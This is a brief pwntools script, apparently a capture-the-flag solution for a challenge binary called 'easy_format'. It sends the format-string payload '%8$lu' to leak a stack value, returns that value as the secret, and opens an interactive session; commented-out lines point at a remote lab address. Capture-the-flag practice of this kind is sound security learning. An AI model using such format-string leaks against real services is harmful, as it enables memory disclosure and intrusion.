from pwn import *

context.terminal=['tmux','-x','sh','-c']
p=gdb.debug('./easy_format')
# p=remote("10.10.175.204",9999)
# p=remote("127.0.0.1",9999)
# p=process('./easy_format')
elf=ELF('./easy_format')
p.sendline(b'%8$lu')
r=p.recvline().decode()
sec=int(r[7:-1])
print(r)
p.sendline(str(sec))
# payload=
r=p.recv()
print(r.decode())
p.interactive()
